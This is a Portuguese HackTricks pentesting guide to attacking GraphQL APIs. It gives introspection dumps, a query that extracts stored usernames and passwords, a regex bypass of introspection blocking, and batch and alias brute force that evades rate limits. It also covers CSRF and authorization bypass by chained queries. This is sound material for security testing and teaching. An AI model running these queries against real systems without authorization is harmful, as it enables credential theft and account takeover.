# GraphQL

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Introdu√ß√£o

O GraphQL √© **destacado** como uma **alternativa eficiente** √†s APIs REST, oferecendo uma abordagem simplificada para consultar dados do backend. Em contraste com o REST, que frequentemente exige numerosas solicita√ß√µes em endpoints variados para reunir dados, o GraphQL permite a obten√ß√£o de todas as informa√ß√µes necess√°rias por meio de uma **√∫nica solicita√ß√£o**. Essa otimiza√ß√£o beneficia significativamente os desenvolvedores, diminuindo a complexidade de seus processos de busca de dados.

## GraphQL e Seguran√ßa

Com o surgimento de novas tecnologias, incluindo o GraphQL, novas vulnerabilidades de seguran√ßa tamb√©m surgem. Um ponto chave a ser observado √© que o **GraphQL n√£o inclui mecanismos de autentica√ß√£o por padr√£o**. √â responsabilidade dos desenvolvedores implementar tais medidas de seguran√ßa. Sem autentica√ß√£o adequada, os endpoints do GraphQL podem expor informa√ß√µes sens√≠veis a usu√°rios n√£o autenticados, representando um risco significativo de seguran√ßa.

### Ataques de For√ßa Bruta de Diret√≥rio e GraphQL

Para identificar inst√¢ncias de GraphQL expostas, √© recomend√°vel a inclus√£o de caminhos espec√≠ficos em ataques de for√ßa bruta de diret√≥rio. Esses caminhos s√£o:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identificar inst√¢ncias de GraphQL abertas permite a an√°lise das consultas suportadas. Isso √© crucial para entender os dados acess√≠veis atrav√©s do endpoint. O sistema de introspec√ß√£o do GraphQL facilita isso detalhando as consultas que um esquema suporta. Para mais informa√ß√µes sobre isso, consulte a documenta√ß√£o do GraphQL sobre introspec√ß√£o: [**GraphQL: Uma linguagem de consulta para APIs.**](https://graphql.org/learn/introspection/)

### Impress√£o Digital

A ferramenta [**graphw00f**](https://github.com/dolevf/graphw00f) √© capaz de detectar qual mecanismo GraphQL √© usado em um servidor e ent√£o imprime algumas informa√ß√µes √∫teis para o auditor de seguran√ßa.

#### Consultas universais <a href="#universal-queries" id="universal-queries"></a>

Para verificar se uma URL √© um servi√ßo GraphQL, uma **consulta universal**, `query{__typename}`, pode ser enviada. Se a resposta incluir `{"data": {"__typename": "Query"}}`, confirma que a URL hospeda um endpoint GraphQL. Este m√©todo depende do campo `__typename` do GraphQL, que revela o tipo do objeto consultado.
```javascript
query{__typename}
```
### Enumera√ß√£o B√°sica

O GraphQL geralmente suporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Embora por motivos de seguran√ßa seja recomendado permitir apenas json para prevenir ataques CSRF.

#### Introspec√ß√£o

Para usar a introspec√ß√£o para descobrir informa√ß√µes do esquema, consulte o campo `__schema`. Este campo est√° dispon√≠vel no tipo raiz de todas as consultas.
```bash
query={__schema{types{name,fields{name}}}}
```
Com esta consulta, voc√™ encontrar√° o nome de todos os tipos sendo usados:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Com esta consulta, voc√™ pode extrair todos os tipos, seus campos e argumentos (e o tipo dos argumentos). Isso ser√° muito √∫til para saber como consultar o banco de dados.

![](<../../.gitbook/assets/image (950).png>)

**Erros**

√â interessante saber se os **erros** ser√£o **mostrados**, pois contribuir√£o com informa√ß√µes √∫teis.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Enumerar Esquema do Banco de Dados via Introspe√ß√£o**

{% hint style="info" %}
Se a introspe√ß√£o estiver ativada, mas a consulta acima n√£o funcionar, tente remover as diretivas `onOperation`, `onFragment` e `onField` da estrutura da consulta.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspe√ß√£o em linha:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
A √∫ltima linha de c√≥digo √© uma consulta graphql que ir√° despejar todas as metainforma√ß√µes do graphql (nomes de objetos, par√¢metros, tipos...)

![](<../../.gitbook/assets/image (363).png>)

Se a introspe√ß√£o estiver ativada, voc√™ pode usar [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para visualizar em uma GUI todas as op√ß√µes.

### Consultando

Agora que sabemos que tipo de informa√ß√µes est√£o salvas no banco de dados, vamos tentar **extrair alguns valores**.

Na introspe√ß√£o, voc√™ pode encontrar **quais objetos voc√™ pode consultar diretamente** (porque voc√™ n√£o pode consultar um objeto apenas porque ele existe). Na imagem a seguir, voc√™ pode ver que o "_queryType_" √© chamado "_Query_" e que um dos campos do objeto "_Query_" √© "_flags_", que tamb√©m √© um tipo de objeto. Portanto, voc√™ pode consultar o objeto flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Observe que o tipo da consulta "_flags_" √© "_Flags_", e este objeto √© definido como abaixo:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Voc√™ pode ver que os objetos "_Flags_" s√£o compostos por **nome** e **valor**. Ent√£o voc√™ pode obter todos os nomes e valores das flags com a consulta:
```javascript
query={flags{name, value}}
```
Note que, no caso do **objeto a ser consultado** ser um **tipo primitivo** como **string** como no exemplo a seguir

![](<../../.gitbook/assets/image (958).png>)

Voc√™ pode consult√°-lo apenas com:
```javascript
query={hiddenFlags}
```
Em outro exemplo em que havia 2 objetos dentro do objeto tipo "_Query_": "_user_" e "_users_".\
Se esses objetos n√£o precisarem de nenhum argumento para pesquisa, √© poss√≠vel **recuperar todas as informa√ß√µes deles** apenas **solicitando** os dados desejados. Neste exemplo da Internet, voc√™ poderia extrair os nomes de usu√°rio e senhas salvos:

![](<../../.gitbook/assets/image (880).png>)

No entanto, neste exemplo, se voc√™ tentar fazer isso, receber√° este **erro**:

![](<../../.gitbook/assets/image (1042).png>)

Parece que de alguma forma ele ir√° pesquisar usando o argumento "_**uid**_" do tipo _**Int**_.\
De qualquer forma, j√° sab√≠amos que, na se√ß√£o de [Enumera√ß√£o B√°sica](graphql.md#enumera√ß√£o-b√°sica), foi proposta uma consulta que estava nos mostrando todas as informa√ß√µes necess√°rias: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se voc√™ ler a imagem fornecida quando eu executar essa consulta, ver√° que "_**user**_" tinha o **arg** "_**uid**_" do tipo _Int_.

Assim, realizando uma leve for√ßa bruta em _**uid**_, descobri que em _**uid**=**1**_ um nome de usu√°rio e uma senha foram recuperados:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Observe que **descobri** que poderia solicitar os **par√¢metros** "_**user**_" e "_**password**_" porque se eu tentar procurar por algo que n√£o existe (`query={user(uid:1){noExists}}`) recebo este erro:

![](<../../.gitbook/assets/image (707).png>)

E durante a fase de **enumera√ß√£o**, descobri que o objeto "_**dbuser**_" tinha como campos "_**user**_" e "_**password**_.

**Truque de despejo de sequ√™ncia de consulta (obrigado a @BinaryShadow\_)**

Se voc√™ puder pesquisar por um tipo de string, como: `query={theusers(description: ""){username,password}}` e **procurar por uma string vazia**, ele ir√° **despejar todos os dados**. (_Observe que este exemplo n√£o est√° relacionado com o exemplo dos tutoriais, para este exemplo suponha que voc√™ possa pesquisar usando "**theusers**" por um campo de String chamado "**description**"_).

### Pesquisa

Nesta configura√ß√£o, um **banco de dados** cont√©m **pessoas** e **filmes**. **Pessoas** s√£o identificadas por seus **e-mails** e **nomes**; **filmes** por seus **nomes** e **classifica√ß√µes**. **Pessoas** podem ser amigas umas das outras e tamb√©m ter filmes, indicando relacionamentos dentro do banco de dados.

Voc√™ pode **pesquisar** pessoas **pelo** nome e obter seus e-mails:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Voc√™ pode **pesquisar** pessoas **pelo** **nome** e obter os **filmes** **aos quais est√£o inscritas**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Observe como √© indicado recuperar o `name` dos `subscribedMovies` da pessoa.

Tamb√©m √© poss√≠vel **pesquisar v√°rios objetos ao mesmo tempo**. Neste caso, uma busca por 2 filmes √© realizada:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou at√© mesmo **rela√ß√µes de v√°rios objetos diferentes usando aliases**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**As muta√ß√µes s√£o usadas para fazer altera√ß√µes no lado do servidor.**

Na **introspec√ß√£o** voc√™ pode encontrar as **muta√ß√µes** **declaradas**. Na seguinte imagem, o "_MutationType_" √© chamado "_Mutation_" e o objeto "_Mutation_" cont√©m os nomes das muta√ß√µes (como "_addPerson_" neste caso):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Nesta configura√ß√£o, um **banco de dados** cont√©m **pessoas** e **filmes**. **Pessoas** s√£o identificadas por seu **e-mail** e **nome**; **filmes** por seu **nome** e **classifica√ß√£o**. **Pessoas** podem ser amigas umas das outras e tamb√©m ter filmes, indicando relacionamentos dentro do banco de dados.

Uma muta√ß√£o para **criar novos** filmes dentro do banco de dados pode ser como a seguinte (neste exemplo, a muta√ß√£o √© chamada `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observe como tanto os valores quanto o tipo de dados s√£o indicados na consulta.**

Al√©m disso, o banco de dados suporta uma opera√ß√£o de **muta√ß√£o**, chamada `addPerson`, que permite a cria√ß√£o de **pessoas** juntamente com suas associa√ß√µes a **amigos** e **filmes** existentes. √â crucial observar que os amigos e filmes devem existir previamente no banco de dados antes de vincul√°-los √† pessoa rec√©m-criada.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Sobrecarga de Diretivas

Conforme explicado em [**uma das vulnerabilidades descritas neste relat√≥rio**](https://www.landh.tech/blog/20240304-google-hack-50000/), uma sobrecarga de diretivas implica na chamada de uma diretiva mesmo milh√µes de vezes para fazer o servidor desperdi√ßar opera√ß√µes at√© ser poss√≠vel realiz√°-lo um ataque de nega√ß√£o de servi√ßo (DoS).

### For√ßa bruta em lote em 1 solicita√ß√£o de API

Essa informa√ß√£o foi retirada de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentica√ß√£o por meio da API GraphQL com **envio simult√¢neo de muitas consultas com credenciais diferentes** para verifica√ß√£o. √â um ataque cl√°ssico de for√ßa bruta, mas agora √© poss√≠vel enviar mais de um par de login/senha por solicita√ß√£o HTTP devido ao recurso de loteamento do GraphQL. Essa abordagem enganaria aplicativos externos de monitoramento de taxa, fazendo-os pensar que est√° tudo bem e que n√£o h√° um bot de for√ßa bruta tentando adivinhar senhas.

Abaixo voc√™ pode encontrar a demonstra√ß√£o mais simples de uma solicita√ß√£o de autentica√ß√£o de aplicativo, com **3 pares de email/senha diferentes por vez**. Obviamente, √© poss√≠vel enviar milhares em uma √∫nica solicita√ß√£o da mesma maneira:

![](<../../.gitbook/assets/image (1081).png>)

Como podemos ver na captura de tela da resposta, a primeira e a terceira solicita√ß√µes retornaram _null_ e refletiram as informa√ß√µes correspondentes na se√ß√£o de _error_. A **segunda muta√ß√£o teve os dados de autentica√ß√£o corretos** e a resposta possui o token de sess√£o de autentica√ß√£o correto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sem Introspec√ß√£o

Cada vez mais **os pontos finais do graphql est√£o desabilitando a introspec√ß√£o**. No entanto, os erros que o graphql lan√ßa quando uma solicita√ß√£o inesperada √© recebida s√£o suficientes para ferramentas como [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) recriarem a maior parte do esquema.

Al√©m disso, a extens√£o do Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observa as solicita√ß√µes da API GraphQL passando pelo Burp** e **constr√≥i** um esquema interno do GraphQL **com cada nova consulta que v√™**. Tamb√©m pode expor o esquema para GraphiQL e Voyager. A extens√£o retorna uma resposta falsa quando recebe uma consulta de introspec√ß√£o. Como resultado, o GraphQuail mostra todas as consultas, argumentos e campos dispon√≠veis para uso na API. Para mais informa√ß√µes [**verifique isso**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Uma **lista de palavras** √∫til para descobrir [**entidades GraphQL pode ser encontrada aqui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassing Defesas de Introspec√ß√£o GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Para contornar restri√ß√µes em consultas de introspec√ß√£o em APIs, inserir um **caractere especial ap√≥s a palavra-chave `__schema`** se mostra eficaz. Este m√©todo explora descuidos comuns de desenvolvedores em padr√µes de regex que visam bloquear a introspec√ß√£o ao focar na palavra-chave `__schema`. Adicionando caracteres como **espa√ßos, quebras de linha e v√≠rgulas**, que o GraphQL ignora mas que podem n√£o ser considerados em regex, as restri√ß√µes podem ser contornadas. Por exemplo, uma consulta de introspec√ß√£o com uma quebra de linha ap√≥s `__schema` pode burlar tais defesas:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se n√£o tiver sucesso, considere m√©todos de solicita√ß√£o alternativos, como **solicita√ß√µes GET** ou **POST com `x-www-form-urlencoded`**, pois as restri√ß√µes podem se aplicar apenas √†s solicita√ß√µes POST.

### **Descobrindo Estruturas GraphQL Expostas**

Quando a introspec√ß√£o est√° desativada, examinar o c√≥digo-fonte do site em busca de consultas pr√©-carregadas em bibliotecas JavaScript √© uma estrat√©gia √∫til. Essas consultas podem ser encontradas usando a guia `Sources` nas ferramentas de desenvolvedor, fornecendo insights sobre o esquema da API e revelando potencialmente **consultas sens√≠veis expostas**. Os comandos para pesquisar dentro das ferramentas de desenvolvedor s√£o:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF em GraphQL

Se voc√™ n√£o sabe o que √© CSRF, leia a seguinte p√°gina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

L√° fora, voc√™ ser√° capaz de encontrar v√°rios endpoints GraphQL **configurados sem tokens CSRF.**

Observe que as solicita√ß√µes GraphQL geralmente s√£o enviadas via solicita√ß√µes POST usando o Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
No entanto, a maioria dos pontos finais do GraphQL tamb√©m suporta **pedidos POST** **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Portanto, como as solicita√ß√µes CSRF como as anteriores s√£o enviadas **sem solicita√ß√µes de preflight**, √© poss√≠vel **realizar** **altera√ß√µes** no GraphQL abusando de um CSRF.

No entanto, observe que o novo valor padr√£o do cookie da flag `samesite` do Chrome √© `Lax`. Isso significa que o cookie s√≥ ser√° enviado de um site de terceiros em solicita√ß√µes GET.

Observe que geralmente √© poss√≠vel enviar a **solicita√ß√£o** **de consulta** tamb√©m como uma **solicita√ß√£o GET e o token CSRF pode n√£o ser validado em uma solicita√ß√£o GET.**

Al√©m disso, abusar de um [**ataque XS-Search**](../../pentesting-web/xs-search/) pode ser poss√≠vel para extrair conte√∫do do endpoint GraphQL abusando das credenciais do usu√°rio.

Para mais informa√ß√µes, **verifique o** [**post original aqui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autoriza√ß√£o no GraphQL

Muitas fun√ß√µes GraphQL definidas no endpoint podem verificar apenas a autentica√ß√£o do solicitante, mas n√£o a autoriza√ß√£o.

Modificar as vari√°veis de entrada da consulta pode resultar em detalhes da conta sens√≠veis [vazados](https://hackerone.com/reports/792927).

A muta√ß√£o pode at√© resultar em uma tomada de conta tentando modificar dados de outras contas.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypassar autoriza√ß√£o no GraphQL

[Encadear consultas](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) pode contornar um sistema de autentica√ß√£o fraco.

No exemplo abaixo, voc√™ pode ver que a opera√ß√£o √© "forgotPassword" e que ela deve executar apenas a consulta forgotPassword associada a ela. Isso pode ser contornado adicionando uma consulta ao final, neste caso adicionamos "register" e uma vari√°vel de usu√°rio para o sistema se registrar como um novo usu√°rio.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypass de Limites de Taxa Usando Aliases no GraphQL

No GraphQL, os aliases s√£o um recurso poderoso que permite **nomear propriedades explicitamente** ao fazer uma solicita√ß√£o de API. Essa capacidade √© particularmente √∫til para recuperar **m√∫ltiplas inst√¢ncias do mesmo tipo** de objeto em uma √∫nica solicita√ß√£o. Os aliases podem ser usados para superar a limita√ß√£o que impede que objetos GraphQL tenham v√°rias propriedades com o mesmo nome.

Para uma compreens√£o detalhada dos aliases do GraphQL, recomenda-se o seguinte recurso: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Embora o objetivo principal dos aliases seja reduzir a necessidade de in√∫meras chamadas de API, foi identificado um caso de uso n√£o intencional em que os aliases podem ser aproveitados para executar ataques de for√ßa bruta em um endpoint GraphQL. Isso √© poss√≠vel porque alguns endpoints s√£o protegidos por limitadores de taxa projetados para impedir ataques de for√ßa bruta restringindo o **n√∫mero de solicita√ß√µes HTTP**. No entanto, esses limitadores de taxa podem n√£o considerar o n√∫mero de opera√ß√µes dentro de cada solicita√ß√£o. Dado que os aliases permitem a inclus√£o de v√°rias consultas em uma √∫nica solicita√ß√£o HTTP, eles podem contornar tais medidas de limita√ß√£o de taxa.

Considere o exemplo fornecido abaixo, que ilustra como consultas com aliases podem ser usadas para verificar a validade de c√≥digos de desconto de loja. Este m√©todo poderia contornar a limita√ß√£o de taxa, pois compila v√°rias consultas em uma √∫nica solicita√ß√£o HTTP, permitindo potencialmente a verifica√ß√£o de v√°rios c√≥digos de desconto simultaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Ferramentas

### Scanners de Vulnerabilidades

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testa configura√ß√µes incorretas comuns em pontos finais graphql
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Identifica a vers√£o do graphql sendo usada
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Conjunto de ferramentas que pode ser usado para obter esquemas e buscar por dados sens√≠veis, testar autoriza√ß√£o, for√ßar esquemas e encontrar caminhos para um tipo espec√≠fico.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pode ser usado como um aplicativo independente ou [extens√£o do Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pode ser usado como um cliente CLI para automatizar ataques
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Ferramenta que lista as diferentes maneiras de alcan√ßar um tipo espec√≠fico em um esquema GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extens√£o do Burp para testes avan√ßados de GraphQL. O _**Scanner**_ √© o n√∫cleo do InQL v5.0, onde voc√™ pode analisar um ponto final GraphQL ou um arquivo de esquema de introspec√ß√£o local. Ele gera automaticamente todas as consultas e muta√ß√µes poss√≠veis, organizando-as em uma visualiza√ß√£o estruturada para sua an√°lise. O componente _**Attacker**_ permite executar ataques em lote GraphQL, o que pode ser √∫til para contornar limites de taxa mal implementados.

### Clientes

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Cliente GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Cliente GUI

### Testes Autom√°ticos

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* V√≠deo explicando o AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Refer√™ncias

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
